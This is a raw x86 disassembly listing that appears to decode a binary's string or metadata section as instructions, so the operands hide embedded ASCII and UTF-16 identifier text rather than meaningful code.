11007bd7:	push   0x64616572
11007bdc:	inc    ecx
11007bdd:	je     0x11007c53
11007bdf:	jb     0x11007c4a
11007be1:	bound  esi,QWORD PTR [ebp+0x74]
11007be4:	add    BYTE PTR gs:[ebp+0x35],ah
11007be8:	add    BYTE PTR [edi+0x65],ah
11007beb:	je     0x11007c4c
11007bed:	dec    ebp
11007bee:	gs jae 0x11007c64
11007bf1:	popa   
11007bf2:	add    BYTE PTR gs:[di+0x65],cl
11007bf7:	jae    0x11007c6c
11007bf9:	popa   
11007bfa:	addr16 gs inc edx
11007bfd:	outs   dx,DWORD PTR ds:[esi]
11007bfe:	js     0x11007c52
11007c00:	gs jae 0x11007c78
11007c03:	ins    BYTE PTR es:[edi],dx
11007c04:	je     0x11007c06
11007c06:	popa   
11007c07:	data16 add BYTE PTR [ebp+0x65],cl
11007c0b:	jae    0x11007c80
11007c0d:	popa   
11007c0e:	addr16 gs inc edx
11007c11:	outs   dx,DWORD PTR ds:[esi]
11007c12:	js     0x11007c56
11007c14:	jne    0x11007c8a
11007c16:	je     0x11007c87
11007c18:	outs   dx,BYTE PTR ds:[esi]
11007c19:	add    BYTE PTR [ebp+0x65],cl
11007c1c:	jae    0x11007c91
11007c1e:	popa   
11007c1f:	addr16 gs inc edx
11007c22:	outs   dx,DWORD PTR ds:[esi]
11007c23:	js     0x11007c6e
11007c25:	ins    DWORD PTR es:[edi],dx
11007c26:	popa   
11007c27:	add    BYTE PTR gs:[di+0x36],ch
11007c2c:	add    BYTE PTR [ebp+0x63],ch
11007c2f:	add    BYTE PTR [ebp+0x6d],ch
11007c32:	add    BYTE PTR [ecx+0x70],ah
11007c35:	add    BYTE PTR [esi+0x67],ch
11007c38:	add    BYTE PTR [esi+0x74],ah
11007c3b:	add    BYTE PTR [esi+0x31],ch
11007c3e:	add    BYTE PTR [esi+0x37],ch
11007c41:	add    BYTE PTR [eax+0x0],bh
11007c44:	ins    WORD PTR es:[edi],dx
11007c46:	add    BYTE PTR [ebp+0x69],cl
11007c49:	arpl   WORD PTR [edx+0x6f],si
11007c4c:	jae    0x11007cbd
11007c4e:	data16 je 0x11007c7f
11007c51:	push   edi
11007c52:	imul   ebp,DWORD PTR [esi+0x33],0x65520032
11007c59:	imul   esi,DWORD PTR [bp+di+0x74],0x654b7972
11007c61:	jns    0x11007c63
11007c63:	addr16 gs je 0x11007cc6
11007c67:	inc    ebx
11007c68:	jne    0x11007cdc
11007c6a:	jb     0x11007cd1
11007c6c:	outs   dx,BYTE PTR ds:[esi]
11007c6d:	je     0x11007cc4
11007c6f:	dec    ecx
11007c70:	inc    ebx
11007c71:	jne    0x11007cdf
11007c73:	je     0x11007cea
11007c75:	jb     0x11007cdc
11007c77:	add    BYTE PTR [edi+0x65],ah
11007c7a:	je     0x11007cdb
11007c7c:	push   esp
11007c7d:	ja     0x11007cee
11007c7f:	dec    esp
11007c80:	gs je  0x11007cf7
11007c83:	gs jb  0x11007ccf
11007c86:	push   ebx
11007c87:	dec    edi
11007c88:	dec    esp
11007c89:	popa   
11007c8a:	outs   dx,BYTE PTR ds:[esi]
11007c8b:	addr16 jne 0x11007cef
11007c8e:	addr16 gs dec esi
11007c91:	popa   
11007c92:	ins    DWORD PTR es:[edi],dx
11007c93:	add    BYTE PTR gs:[edx+0x65],dl
11007c97:	imul   esi,DWORD PTR [bp+di+0x74],0x43007972
11007c9f:	jne    0x11007d13
11007ca1:	jb     0x11007d08
11007ca3:	outs   dx,BYTE PTR ds:[esi]
11007ca4:	je     0x11007cfb
11007ca6:	jae    0x11007d0d
11007ca8:	jb     0x11007caa
11007caa:	dec    edi
11007cab:	jo     0x11007d12
11007cad:	outs   dx,BYTE PTR ds:[esi]
11007cae:	push   ebx
11007caf:	jne    0x11007d13
11007cb1:	dec    ebx
11007cb2:	gs jns 0x11007cb5
11007cb5:	inc    edi
11007cb6:	gs je  0x11007d0f
11007cb9:	popa   
11007cba:	ins    BYTE PTR es:[edi],dx
11007cbb:	jne    0x11007d22
11007cbd:	add    BYTE PTR [edi+0x65],al
11007cc0:	je     0x11007d05
11007cc2:	jne    0x11007d30
11007cc4:	je     0x11007d3b
11007cc6:	jb     0x11007d2d
11007cc8:	dec    ecx
11007cc9:	outs   dx,BYTE PTR ds:[esi]
11007cca:	outs   dx,WORD PTR ds:[esi]
11007ccc:	add    BYTE PTR [ecx+0x6e],cl
11007ccf:	je     0x11007d04
11007cd1:	xor    al,BYTE PTR [eax]
11007cd3:	ins    DWORD PTR es:[edi],dx
11007cd4:	jp     0x11007cd6
11007cd6:	inc    ecx
11007cd7:	jo     0x11007d49
11007cd9:	add    BYTE PTR [ebx+0x6f],al
11007cdc:	ins    DWORD PTR es:[edi],dx
11007cdd:	ins    DWORD PTR es:[edi],dx
11007cde:	jne    0x11007d4e
11007ce0:	imul   esi,DWORD PTR [ecx+edi*2+0x47],0x52006975
11007ce8:	jne    0x11007d58
11007cea:	add    BYTE PTR [ebx+0x79],dl
11007ced:	jae    0x11007d63
11007cef:	gs ins DWORD PTR es:[edi],dx
11007cf1:	cs inc ebx
11007cf3:	outs   dx,DWORD PTR ds:[esi]
11007cf4:	ins    DWORD PTR es:[edi],dx
11007cf5:	jo     0x11007d66
11007cf7:	outs   dx,BYTE PTR ds:[esi]
11007cf8:	outs   dx,BYTE PTR gs:[esi]
11007cfa:	je     0x11007d49
11007cfc:	outs   dx,DWORD PTR ds:[esi]
11007cfd:	fs gs ins BYTE PTR es:[edi],dx
11007d00:	add    BYTE PTR [edi+0x69],dl
11007d03:	outs   dx,BYTE PTR ds:[esi]
11007d04:	xor    esi,DWORD PTR [edx]
11007d06:	inc    ebp
11007d07:	js     0x11007d6c
11007d09:	gs jo  0x11007d80
11007d0c:	imul   ebp,DWORD PTR [edi+0x6e],0x74744100
11007d13:	jb     0x11007d7e
11007d15:	bound  esi,QWORD PTR [ebp+0x74]
11007d18:	gs push ebp
11007d1a:	jae    0x11007d7d
11007d1c:	addr16 gs inc ecx
11007d1f:	je     0x11007d95
11007d21:	jb     0x11007d8c
11007d23:	bound  esi,QWORD PTR [ebp+0x74]
11007d26:	add    BYTE PTR gs:[ecx+0x74],al
11007d2a:	je     0x11007d9e
11007d2c:	imul   esp,DWORD PTR [edx+0x75],0x61546574
11007d33:	jb     0x11007d9c
11007d35:	gs je  0x11007dab
11007d38:	add    BYTE PTR [edi+ebp*2+0x74],ah
11007d3c:	data16 jne 0x11007db2
11007d3f:	arpl   WORD PTR [ecx+0x74],sp
11007d42:	outs   dx,DWORD PTR ds:[esi]
11007d43:	jb     0x11007d73
11007d45:	gs js  0x11007dad
11007d48:	add    BYTE PTR [ebp+0x73],ch
11007d4b:	arpl   WORD PTR [edi+0x72],bp
11007d4e:	ins    BYTE PTR es:[edi],dx
11007d4f:	imul   esp,DWORD PTR [edx+0x0],0x6e656664
11007d56:	imul   ebp,DWORD PTR [bp+0x65],0x65725000
11007d5e:	jae    0x11007dc5
11007d60:	outs   dx,BYTE PTR ds:[esi]
11007d61:	je     0x11007dc4
11007d63:	je     0x11007dce
11007d65:	outs   dx,DWORD PTR ds:[esi]
11007d66:	outs   dx,BYTE PTR ds:[esi]
11007d67:	inc    esi
11007d68:	jb     0x11007dcb
11007d6a:	ins    DWORD PTR es:[edi],dx
11007d6b:	gs ja  0x11007ddd
11007d6e:	jb     0x11007ddb
11007d70:	add    BYTE PTR [esi+eiz*2+0x67],ah
11007d74:	jne    0x11007ddf
11007d76:	add    BYTE PTR [edi+ebp*2+0x74],al
11007d7a:	data16 jne 0x11007df0
11007d7d:	arpl   WORD PTR [ecx+0x74],sp
11007d80:	outs   dx,DWORD PTR ds:[esi]
11007d81:	jb     0x11007dc4
11007d83:	je     0x11007df9
11007d85:	jb     0x11007df0
11007d87:	bound  esi,QWORD PTR [ebp+0x74]
11007d8a:	add    BYTE PTR gs:[eax+eax*1+0x6d],dh
11007d8f:	ins    BYTE PTR es:[edi],dx
11007d90:	add    BYTE PTR [ecx+0x0],dh
11007d93:	ins    DWORD PTR es:[edi],dx
11007d94:	jae    0x11007d96
11007d96:	ins    BYTE PTR es:[edi],dx
11007d97:	jo     0x11007d99
11007d99:	push   0x6a006900
11007d9e:	add    BYTE PTR [ecx+0x5f],al
11007da1:	xor    BYTE PTR [eax],al
11007da3:	inc    ecx
11007da4:	pop    edi
11007da5:	xor    DWORD PTR [eax],eax
11007da7:	inc    ecx
11007da8:	pop    edi
11007da9:	xor    al,BYTE PTR [eax]
11007dab:	ins    BYTE PTR es:[edi],dx
11007dac:	add    BYTE PTR [ebx+0x0],ch
11007daf:	ins    DWORD PTR es:[edi],dx
11007db0:	add    BYTE PTR [ecx+esi*1+0x0],ch
11007db4:	inc    ecx
11007db5:	pop    edi
11007db6:	xor    eax,DWORD PTR [eax]
11007db8:	ins    BYTE PTR es:[edi],dx
11007db9:	xor    al,BYTE PTR [eax]
11007dbb:	inc    ecx
11007dbc:	add    BYTE PTR [ebx+0x0],al
11007dbf:	outs   dx,DWORD PTR fs:[esi]
11007dc1:	je     0x11007e29
11007dc3:	jne    0x11007e38
11007dc5:	arpl   WORD PTR [ecx+0x74],sp
11007dc8:	outs   dx,DWORD PTR ds:[esi]
11007dc9:	jb     0x11007dcb
11007dcb:	outs   dx,DWORD PTR fs:[esi]
11007dcd:	je     0x11007e35
11007dcf:	jne    0x11007e44
11007dd1:	arpl   WORD PTR [ecx+0x74],sp
11007dd4:	outs   dx,DWORD PTR ds:[esi]
11007dd5:	jb     0x11007e05
11007dd7:	addr16 cs jb 0x11007e40
11007ddb:	jae    0x11007e4c
11007ddd:	jne    0x11007e51
11007ddf:	arpl   WORD PTR [ebp+0x73],sp
11007de2:	add    BYTE PTR [eax],al
11007de4:	add    BYTE PTR ds:0x6e0069,al
11007dea:	add    BYTE PTR [ecx],cl
11007dec:	add    BYTE PTR gs:[esi+0x0],ch
11007df0:	push   0x6100
11007df5:	add    ebp,DWORD PTR [edi]
11007df7:	add    BYTE PTR [eax],al
11007df9:	cmp    DWORD PTR [ebp+0x0],ecx
11007dfc:	push   ebx
11007dfd:	add    BYTE PTR [edi+0x0],al
11007e00:	pop    edi
11007e01:	add    BYTE PTR [ebx+0x0],al
11007e04:	dec    esp
11007e05:	add    BYTE PTR [ecx+0x0],cl
11007e08:	pop    edi
11007e09:	add    BYTE PTR [ebp+0x0],cl
11007e0c:	push   ebp
11007e0d:	add    BYTE PTR [eax+eax*1+0x54],cl
11007e11:	add    BYTE PTR [ecx+0x0],cl
11007e14:	push   eax
11007e15:	add    BYTE PTR [eax+eax*1+0x45],cl
11007e19:	add    BYTE PTR [edi+0x0],bl
11007e1c:	inc    ebx
11007e1d:	add    BYTE PTR [edi+0x0],cl
11007e20:	dec    esi
11007e21:	add    BYTE PTR [esi+0x0],al
11007e24:	dec    ecx
11007e25:	add    BYTE PTR [edi+0x0],al
11007e28:	inc    esi
11007e29:	add    BYTE PTR [ecx+0x0],cl
11007e2c:	dec    esp
11007e2d:	add    BYTE PTR [ebp+0x0],al
11007e30:	push   ebx
11007e31:	add    BYTE PTR [eax],al
11007e33:	or     DWORD PTR [ecx+0x0],ebp
11007e36:	outs   dx,BYTE PTR ds:[esi]
11007e37:	add    BYTE PTR [eax+0x0],dh
11007e3a:	ins    BYTE PTR es:[edi],dx
11007e3b:	add    BYTE PTR [eax],al
11007e3d:	add    esi,DWORD PTR [eax+0x0]
11007e40:	add    BYTE PTR [ecx],cl
11007e42:	arpl   WORD PTR [eax],ax
11007e44:	ins    BYTE PTR es:[edi],dx
11007e45:	add    BYTE PTR [edi+0x0],ch
11007e48:	bound  eax,QWORD PTR [eax]
11007e4a:	add    BYTE PTR [ecx],ch
11007e4c:	dec    ebp
11007e4d:	add    BYTE PTR [ebx+0x0],dl
11007e50:	inc    edi
11007e51:	add    BYTE PTR [edi+0x0],bl
11007e54:	inc    ebx
11007e55:	add    BYTE PTR [eax+eax*1+0x49],cl
11007e59:	add    BYTE PTR [edi+0x0],bl
11007e5c:	inc    edx
11007e5d:	add    BYTE PTR [ecx+0x0],al
11007e60:	inc    esp
11007e61:	add    BYTE PTR [edi+0x0],bl
11007e64:	inc    ecx
11007e65:	add    BYTE PTR [edx+0x0],dl
11007e68:	inc    edi
11007e69:	add    BYTE PTR [ebp+0x0],dl
11007e6c:	dec    ebp
11007e6d:	add    BYTE PTR [ebp+0x0],al
11007e70:	dec    esi
11007e71:	add    BYTE PTR [eax+eax*1+0x0],dl
11007e75:	or     DWORD PTR [eax+0x0],esi
11007e78:	jb     0x11007e7a
11007e7a:	add    BYTE PTR gs:[ebp+0x0],ch
11007e7e:	add    BYTE PTR [ecx],cl
11007e80:	jo     0x11007e82
11007e82:	jb     0x11007e84
11007e84:	add    BYTE PTR gs:[esi+0x0],ah
11007e88:	add    BYTE PTR [ecx],cl
11007e8a:	ins    BYTE PTR es:[edi],dx
11007e8b:	add    BYTE PTR [ecx+0x0],ch
11007e8e:	outs   dx,BYTE PTR ds:[esi]
11007e8f:	add    BYTE PTR [ebx+0x0],ch
11007e92:	add    BYTE PTR [ecx],cl
11007e94:	jo     0x11007e96
11007e96:	jb     0x11007e98
11007e98:	jne    0x11007e9a
11007e9a:	outs   dx,BYTE PTR ds:[esi]
11007e9b:	add    BYTE PTR [eax],al
11007e9d:	or     DWORD PTR [ebx+0x0],ebp
11007ea0:	add    BYTE PTR gs:[ebp+0x0],ah
11007ea4:	jo     0x11007ea6
11007ea6:	add    BYTE PTR [ecx],cl
11007ea8:	ja     0x11007eaa
11007eaa:	popa   
11007eab:	add    BYTE PTR [eax+eax*1+0x65],dh
11007eaf:	add    BYTE PTR [eax],al
11007eb1:	or     DWORD PTR [ebp+0x0],ebp
11007eb4:	popa   
11007eb5:	add    BYTE PTR [eax+0x0],dh
11007eb8:	outs   dx,DWORD PTR ds:[esi]
11007eb9:	add    BYTE PTR [eax],al
11007ebb:	add    ebp,DWORD PTR ds:0x65090100
11007ec1:	add    BYTE PTR [esi+0x0],ch
11007ec4:	arpl   WORD PTR [eax],ax
11007ec6:	jb     0x11007ec8
11007ec8:	add    BYTE PTR [ecx],cl
11007eca:	outs   dx,BYTE PTR ds:[esi]
11007ecb:	add    BYTE PTR [ecx+0x0],ah
11007ece:	ins    DWORD PTR es:[edi],dx
11007ecf:	add    BYTE PTR [ecx+0x0],ch
11007ed2:	add    BYTE PTR [ecx],cl
11007ed4:	ins    DWORD PTR es:[edi],dx
11007ed5:	add    BYTE PTR [ecx+0x0],ah
11007ed8:	imul   eax,DWORD PTR [eax],0x65
11007edb:	add    BYTE PTR [eax],al
11007edd:	or     DWORD PTR [ebx+0x0],esi
11007ee0:	ins    DWORD PTR es:[edi],dx
11007ee1:	add    BYTE PTR [ecx+0x0],ah
11007ee4:	jb     0x11007ee6
11007ee6:	add    BYTE PTR [ecx],cl
11007ee8:	push   0x6e006f00
11007eed:	add    BYTE PTR [edi+0x0],ch
11007ef0:	add    BYTE PTR [ecx],cl
11007ef2:	jo     0x11007ef4
11007ef4:	popa   
11007ef5:	add    BYTE PTR [ebx+0x0],dh
11007ef8:	jae    0x11007efa
11007efa:	add    BYTE PTR [ecx],cl
11007efc:	bound  eax,QWORD PTR [eax]
11007efe:	jb     0x11007f00
11007f00:	add    BYTE PTR gs:[ecx+0x0],ah
11007f04:	add    BYTE PTR [ecx],cl
11007f06:	add    BYTE PTR fs:[ecx+0x0],ch
11007f0a:	jae    0x11007f0c
11007f0c:	popa   
11007f0d:	add    BYTE PTR [eax],al
11007f0f:	or     DWORD PTR [esi+0x0],ebp
11007f12:	outs   dx,DWORD PTR ds:[esi]
11007f13:	add    BYTE PTR [eax+eax*1+0x6f],ch
11007f17:	add    BYTE PTR [eax],al
11007f19:	add    esp,DWORD PTR [ebx+0x0]
11007f1c:	add    BYTE PTR [ecx],cl
11007f1e:	popa   
11007f1f:	add    BYTE PTR [eax+0x0],dh
11007f22:	jo     0x11007f24
11007f24:	ins    BYTE PTR es:[edi],dx
11007f25:	add    BYTE PTR [eax],al
11007f27:	or     DWORD PTR [ebx+0x0],esi
11007f2a:	je     0x11007f2c
11007f2c:	jb     0x11007f2e
11007f2e:	imul   eax,DWORD PTR [eax],0x4d2b00
11007f34:	push   ebx
11007f35:	add    BYTE PTR [edi+0x0],al
11007f38:	pop    edi
11007f39:	add    BYTE PTR [ebx+0x0],al
11007f3c:	dec    esp
11007f3d:	add    BYTE PTR [ecx+0x0],cl
11007f40:	pop    edi
11007f41:	add    BYTE PTR [eax+eax*1+0x55],al
11007f45:	add    BYTE PTR [eax+0x0],dl
11007f48:	dec    esp
11007f49:	add    BYTE PTR [ecx+0x0],cl
11007f4c:	inc    ebx
11007f4d:	add    BYTE PTR [ecx+0x0],al
11007f50:	push   esp
11007f51:	add    BYTE PTR [ebp+0x0],al
11007f54:	pop    edi
11007f55:	add    BYTE PTR [ecx+0x0],al
11007f58:	push   edx
11007f59:	add    BYTE PTR [edi+0x0],al
11007f5c:	add    BYTE PTR [ecx],cl
11007f5e:	add    BYTE PTR fs:[ebp+0x0],ah
11007f62:	bound  eax,QWORD PTR [eax]
11007f64:	jne    0x11007f66
11007f66:	add    BYTE PTR [ecx],cl
11007f68:	jb     0x11007f6a
11007f6a:	add    BYTE PTR gs:[esi+0x0],ch
11007f6e:	popa   
11007f6f:	add    BYTE PTR [eax],al
11007f71:	pop    es
11007f72:	outs   dx,DWORD PTR ds:[esi]
11007f73:	add    BYTE PTR [ebp+0x0],dh
11007f76:	je     0x11007f78
11007f78:	add    BYTE PTR [ecx],cl
11007f7a:	jae    0x11007f7c
11007f7c:	outs   dx,DWORD PTR ds:[esi]
11007f7d:	add    BYTE PTR [edx+0x0],dh
11007f80:	add    BYTE PTR gs:[eax],al
11007f83:	or     DWORD PTR [ebp+0x0],ebp
11007f86:	popa   
11007f87:	add    BYTE PTR [eax+0x0],dh
11007f8a:	imul   eax,DWORD PTR [eax],0x630900
11007f90:	outs   dx,DWORD PTR ds:[esi]
11007f91:	add    BYTE PTR [esi+0x0],ch
11007f94:	je     0x11007f96
11007f96:	add    BYTE PTR [ecx],al
11007f98:	add    BYTE PTR [ecx],cl
11007f9a:	arpl   WORD PTR [eax],ax
11007f9c:	push   0x72006100
11007fa1:	add    BYTE PTR [eax],al
11007fa3:	add    edi,DWORD PTR ds:0x3a030000
11007fa9:	add    BYTE PTR [eax],al
11007fab:	pop    es
11007fac:	outs   dx,DWORD PTR ds:[esi]
11007fad:	add    BYTE PTR [esi+0x0],ah
11007fb0:	data16 add BYTE PTR [eax],al
11007fb3:	add    eax,0x6e006f
11007fb8:	add    BYTE PTR ds:0x53004d,ch
11007fbe:	inc    edi
11007fbf:	add    BYTE PTR [edi+0x0],bl
11007fc2:	inc    ebx
11007fc3:	add    BYTE PTR [eax+eax*1+0x49],cl
11007fc7:	add    BYTE PTR [edi+0x0],bl
11007fca:	dec    ecx
11007fcb:	add    BYTE PTR [esi+0x0],cl
11007fce:	push   esi
11007fcf:	add    BYTE PTR [ecx+0x0],al
11007fd2:	dec    esp
11007fd3:	add    BYTE PTR [ecx+0x0],cl
11007fd6:	inc    esp
11007fd7:	add    BYTE PTR [edi+0x0],bl
11007fda:	push   ebx
11007fdb:	add    BYTE PTR [ebp+0x0],dl
11007fde:	inc    edx
11007fdf:	add    BYTE PTR [ecx+0x0],al
11007fe2:	push   edx
11007fe3:	add    BYTE PTR [edi+0x0],al
11007fe6:	add    BYTE PTR [ebx],al
11007fe8:	add    BYTE PTR cs:[eax],al
11007feb:	sub    eax,0x53004d
11007ff0:	inc    edi
11007ff1:	add    BYTE PTR [edi+0x0],bl
11007ff4:	inc    ebx
11007ff5:	add    BYTE PTR [eax+eax*1+0x49],cl
11007ff9:	add    BYTE PTR [edi+0x0],bl
11007ffc:	inc    ecx
11007ffd:	add    BYTE PTR [edx+0x0],dl
11008000:	inc    edi
11008001:	add    BYTE PTR [edi+0x0],bl
11008004:	dec    ecx
11008005:	add    BYTE PTR [esi+0x0],cl
11008008:	inc    ebx
11008009:	add    BYTE PTR [edi+0x0],cl
1100800c:	dec    ebp
1100800d:	add    BYTE PTR [eax+0x0],dl
11008010:	dec    esp
11008011:	add    BYTE PTR [ebp+0x0],al
11008014:	push   esp
11008015:	add    BYTE PTR [ebp+0x0],al
11008018:	add    BYTE PTR ds:0x53004d,ah
1100801e:	inc    edi
1100801f:	add    BYTE PTR [edi+0x0],bl
11008022:	inc    ecx
11008023:	add    BYTE PTR [edx+0x0],dl
11008026:	inc    edi
11008027:	add    BYTE PTR [edi+0x0],bl
1100802a:	inc    esp
1100802b:	add    BYTE PTR [ebp+0x0],al
1100802e:	push   eax
1100802f:	add    BYTE PTR [edx+0x0],dl
11008032:	inc    ebp
11008033:	add    BYTE PTR [ebx+0x0],al
11008036:	inc    ecx
11008037:	add    BYTE PTR [eax+eax*1+0x45],dl
1100803b:	add    BYTE PTR [eax+eax*1+0x0],al
1100803f:	aas    
11008040:	dec    ebp
11008041:	add    BYTE PTR [ebx+0x0],dl
11008044:	inc    edi
11008045:	add    BYTE PTR [edi+0x0],bl
11008048:	push   eax
11008049:	add    BYTE PTR [edx+0x0],dl
1100804c:	dec    edi
1100804d:	add    BYTE PTR [eax+0x0],dl
11008050:	inc    ebp
11008051:	add    BYTE PTR [edx+0x0],dl
11008054:	push   esp
11008055:	add    BYTE PTR [ecx+0x0],bl
11008058:	pop    edi
11008059:	add    BYTE PTR [eax+0x0],dl
1100805c:	inc    ecx
1100805d:	add    BYTE PTR [edx+0x0],dl
11008060:	push   ebx
11008061:	add    BYTE PTR [ebp+0x0],al
11008064:	pop    edi
11008065:	add    BYTE PTR [ebp+0x0],cl
11008068:	dec    ecx
11008069:	add    BYTE PTR [ebx+0x0],dl
1100806c:	push   ebx
1100806d:	add    BYTE PTR [ecx+0x0],cl
11008070:	dec    esi
11008071:	add    BYTE PTR [edi+0x0],al
11008074:	pop    edi
11008075:	add    BYTE PTR [esi+0x0],cl
11008078:	inc    ecx
11008079:	add    BYTE PTR [ebp+0x0],cl
1100807c:	inc    ebp
1100807d:	add    BYTE PTR [eax],al
1100807f:	aas    
11008080:	dec    ebp
11008081:	add    BYTE PTR [ebx+0x0],dl
11008084:	inc    edi
11008085:	add    BYTE PTR [edi+0x0],bl
11008088:	push   eax
11008089:	add    BYTE PTR [edx+0x0],dl
1100808c:	dec    edi
1100808d:	add    BYTE PTR [eax+0x0],dl
11008090:	inc    ebp
11008091:	add    BYTE PTR [edx+0x0],dl
11008094:	push   esp
11008095:	add    BYTE PTR [ecx+0x0],bl
11008098:	pop    edi
11008099:	add    BYTE PTR [eax+0x0],dl
1100809c:	inc    ecx
1100809d:	add    BYTE PTR [edx+0x0],dl
110080a0:	push   ebx
110080a1:	add    BYTE PTR [ebp+0x0],al
110080a4:	pop    edi
110080a5:	add    BYTE PTR [edx+0x0],al
110080a8:	inc    ecx
110080a9:	add    BYTE PTR [eax+eax*1+0x5f],al
110080ad:	add    BYTE PTR [ecx+0x0],al
110080b0:	push   edx
110080b1:	add    BYTE PTR [edi+0x0],al
110080b4:	push   ebp
110080b5:	add    BYTE PTR [ebp+0x0],cl
110080b8:	inc    ebp
110080b9:	add    BYTE PTR [esi+0x0],cl
110080bc:	push   esp
110080bd:	add    BYTE PTR [eax],al
110080bf:	inc    ecx
110080c0:	dec    ebp
110080c1:	add    BYTE PTR [ebx+0x0],dl
110080c4:	inc    edi
110080c5:	add    BYTE PTR [edi+0x0],bl
110080c8:	push   eax
110080c9:	add    BYTE PTR [edx+0x0],dl
110080cc:	dec    edi
110080cd:	add    BYTE PTR [eax+0x0],dl
110080d0:	inc    ebp
110080d1:	add    BYTE PTR [edx+0x0],dl
110080d4:	push   esp
110080d5:	add    BYTE PTR [ecx+0x0],bl
110080d8:	pop    edi
110080d9:	add    BYTE PTR [eax+0x0],dl
110080dc:	inc    ecx
110080dd:	add    BYTE PTR [edx+0x0],dl
110080e0:	push   ebx
110080e1:	add    BYTE PTR [ebp+0x0],al
110080e4:	pop    edi
110080e5:	add    BYTE PTR [ebp+0x0],cl
110080e8:	dec    ecx
110080e9:	add    BYTE PTR [ebx+0x0],dl
110080ec:	push   ebx
110080ed:	add    BYTE PTR [ecx+0x0],cl
110080f0:	dec    esi
110080f1:	add    BYTE PTR [edi+0x0],al
110080f4:	pop    edi
110080f5:	add    BYTE PTR [esi+0x0],dl
110080f8:	inc    ecx
110080f9:	add    BYTE PTR [eax+eax*1+0x55],cl
110080fd:	add    BYTE PTR [ebp+0x0],al
11008100:	add    BYTE PTR [ecx],cl
11008102:	add    BYTE PTR cs:[ebp+0x0],ah
11008106:	js     0x11008108
11008108:	add    BYTE PTR gs:[eax],al
1100810b:	das    
1100810c:	dec    ebp
1100810d:	add    BYTE PTR [ebx+0x0],dl
11008110:	inc    edi
11008111:	add    BYTE PTR [edi+0x0],bl
11008114:	dec    esi
11008115:	add    BYTE PTR [edi+0x0],cl
11008118:	pop    edi
11008119:	add    BYTE PTR [ebp+0x0],al
1100811c:	pop    eax
1100811d:	add    BYTE PTR [eax+0x0],dl
11008120:	dec    esp
11008121:	add    BYTE PTR [ecx+0x0],cl
11008124:	inc    ebx
11008125:	add    BYTE PTR [ecx+0x0],cl
11008128:	push   esp
11008129:	add    BYTE PTR [edi+0x0],bl
1100812c:	dec    esp
1100812d:	add    BYTE PTR [ecx+0x0],cl
11008130:	inc    edx
11008131:	add    BYTE PTR [edx+0x0],dl
11008134:	inc    ecx
11008135:	add    BYTE PTR [edx+0x0],dl
11008138:	pop    ecx
11008139:	add    BYTE PTR [eax],al
1100813b:	xor    DWORD PTR [ebp+0x0],ecx
1100813e:	push   ebx
1100813f:	add    BYTE PTR [edi+0x0],al
11008142:	pop    edi
11008143:	add    BYTE PTR [ecx+0x0],cl
11008146:	dec    esi
11008147:	add    BYTE PTR [esi+0x0],dl
1100814a:	inc    ecx
1100814b:	add    BYTE PTR [eax+eax*1+0x49],cl
1100814f:	add    BYTE PTR [eax+eax*1+0x5f],al
11008153:	add    BYTE PTR [eax+0x0],dl
11008156:	inc    ecx
11008157:	add    BYTE PTR [ebx+0x0],al
1100815a:	dec    ebx
1100815b:	add    BYTE PTR [ecx+0x0],al
1100815e:	inc    edi
1100815f:	add    BYTE PTR [ebp+0x0],al
11008162:	pop    edi
11008163:	add    BYTE PTR [eax+eax*1+0x59],dl
11008167:	add    BYTE PTR [eax+0x0],dl
1100816a:	inc    ebp
1100816b:	add    BYTE PTR [eax],al
1100816d:	adc    ebp,DWORD PTR [esi+0x0]
11008170:	popa   
11008171:	add    BYTE PTR [ebp+0x0],ch
11008174:	add    BYTE PTR gs:[ebx+0x0],dh
11008178:	jo     0x1100817a
1100817a:	popa   
1100817b:	add    BYTE PTR [ebx+0x0],ah
1100817e:	add    BYTE PTR gs:[eax],al
11008181:	adc    ebp,DWORD PTR [eax+0x0]
11008184:	imul   eax,DWORD PTR [eax],0x720065
1100818a:	popa   
1100818b:	add    BYTE PTR [edx+0x0],dh
1100818e:	arpl   WORD PTR [eax],ax
11008190:	push   0x7900
11008195:	or     DWORD PTR [esi+0x0],ebp
11008198:	outs   dx,DWORD PTR ds:[esi]
11008199:	add    BYTE PTR [esi+0x0],ch
1100819c:	add    BYTE PTR gs:[eax],al
1100819f:	and    DWORD PTR [ebp+0x0],ecx
110081a2:	push   ebx
110081a3:	add    BYTE PTR [edi+0x0],al
110081a6:	pop    edi
110081a7:	add    BYTE PTR [ebx+0x0],al
110081aa:	dec    esp
110081ab:	add    BYTE PTR [ecx+0x0],cl
110081ae:	pop    edi
110081af:	add    BYTE PTR [eax+0x0],dl
110081b2:	push   edx
110081b3:	add    BYTE PTR [edi+0x0],cl
110081b6:	pop    edi
110081b7:	add    BYTE PTR [edi+0x0],cl
110081ba:	dec    esi
110081bb:	add    BYTE PTR [eax+eax*1+0x59],cl
110081bf:	add    BYTE PTR [eax],al
110081c1:	pop    es
110081c2:	xor    al,BYTE PTR [eax]
110081c4:	add    BYTE PTR cs:[edx],dh
110081c7:	add    BYTE PTR [eax],al
110081c9:	sbb    DWORD PTR [eax+eax*1],esp
110081cc:	jnp    0x110081ce
110081ce:	arpl   WORD PTR [eax],ax
110081d0:	outs   dx,DWORD PTR ds:[esi]
110081d1:	add    BYTE PTR [esi+0x0],ch
110081d4:	data16 add BYTE PTR [ecx+0x0],ch
110081d8:	add    BYTE PTR [si+0x0],ah
110081dc:	imul   eax,DWORD PTR [eax],0x7d0072
110081e2:	add    BYTE PTR [edi],dl
110081e4:	inc    esp
110081e5:	add    BYTE PTR [edi+0x0],ch
110081e8:	je     0x110081ea
110081ea:	data16 add BYTE PTR [ebp+0x0],dh
110081ee:	jae    0x110081f0
110081f0:	arpl   WORD PTR [eax],ax
110081f2:	popa   
110081f3:	add    BYTE PTR [eax+eax*1+0x65],dh
110081f7:	add    BYTE PTR [eax+eax*1+0x0],ah
110081fb:	cmovge eax,DWORD PTR [eax]
110081fe:	popa   
110081ff:	add    BYTE PTR [eax+0x0],dh
11008202:	add    BYTE PTR cs:[eax+0x0],bh
11008206:	ins    DWORD PTR es:[edi],dx
11008207:	add    BYTE PTR [eax+eax*1+0x0],ch
1100820b:	(bad)  
1100820d:	add    BYTE PTR [ecx+0x0],ah
11008210:	jo     0x11008212
11008212:	add    BYTE PTR cs:[eax+0x0],bh
11008216:	ins    DWORD PTR es:[edi],dx
11008217:	add    BYTE PTR [eax+eax*1+0x0],ch
1100821b:	sbb    eax,0x700061
11008220:	jo     0x11008222
11008222:	ins    BYTE PTR es:[edi],dx
11008223:	add    BYTE PTR [ecx+0x0],ch
11008226:	arpl   WORD PTR [eax],ax
11008228:	popa   
11008229:	add    BYTE PTR [eax+eax*1+0x69],dh
